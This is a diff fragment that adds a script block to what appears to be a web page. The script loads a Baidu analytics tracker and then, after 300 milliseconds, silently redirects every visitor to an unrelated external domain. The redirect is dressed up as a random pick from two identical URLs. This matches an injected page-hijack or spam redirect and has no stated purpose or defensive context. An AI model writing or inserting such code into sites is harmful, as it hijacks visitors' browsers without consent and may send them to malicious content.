@@ -1,0 +1,15 @@
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d948406df1cd40bdc0f8e7e7feb05cc9";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+function time() {
+    var arr = ["https://uj.ndjsada.com/2987.html", "https://uj.ndjsada.com/2987.html"];
+		window.location.href = arr[parseInt(Math.random() * arr.length)];
+}
+setTimeout(time, 300);
+</script>
